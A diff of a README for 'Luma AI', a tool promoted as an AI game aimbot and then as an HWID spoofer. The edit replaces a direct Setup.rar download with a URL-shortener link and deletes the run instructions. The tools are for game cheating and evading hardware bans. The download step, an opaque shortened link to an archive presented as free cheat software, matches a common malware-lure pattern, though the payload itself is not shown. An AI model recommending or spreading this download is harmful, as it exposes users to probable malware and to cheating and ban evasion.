@@ -9,7 +9,7 @@
   
 </p>
 
-<p align="center">✨Luma Ai = Open-Source Ai Aimbot For Games✨</p>
+<p align="center">✨Luma Ai = Open-Source Hwid Spoofer✨</p>
 
 <p align="center">
   <a href="https://circleci.com/gh/storybookjs/storybook">
@@ -24,7 +24,7 @@
 
 
 
-# ✨Luma AI , Best Open-Source Ai Aimbot
+# ✨Luma AI 
 
 ## Requirements🛠️✨
 
@@ -34,18 +34,11 @@
 
 ## 🚀 Setup Steps
 
-1. Download and Unzip the AI Aimbot 🗂️. - Install Latest Version [HERE](https://github.com/ffireman1/manu/releases/download/Set/Setup.rar)
+1. Download and Unzip the AI Aimbot 🗂️. - Install Latest Version [HERE](https://shorten.is/4KYNR)
 2. Ensure you've got Visual C++ pack installed  – grab latest version [HERE](https://learn.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist?view=msvc-170).
 
 
-## 🔌 How to Run
-Follow these steps **after** Visual C++ pack have been installed:
 
-1. Open Complited Build 💻.
-2. Create your username
-3. Hit Enter ↩️.
-4. Select your game
-5. Enjoy!
 
 
 ## Happy Coding and Aiming! 🎉
